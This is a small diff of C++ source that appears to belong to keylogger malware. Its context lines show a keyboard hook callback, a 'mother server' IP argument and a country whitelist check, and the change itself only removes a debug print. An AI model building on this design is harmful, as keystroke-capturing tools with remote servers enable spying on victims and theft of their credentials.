@@ -65,14 +65,11 @@ LRESULT CALLBACK keyboard_callback(int nCode, WPARAM wParam, LPARAM lParam) {
 }
 
 /*
-
 ARGUMENTS: 
 	- 1: initial mother server ip 
 	- 2: whitelisted country
 */
 int main(int argc, char** argv) {
-
-	std::cout << "lmao" << std::endl; 
 
 	// security Checks 
 	if (!check_country(argv[2]))
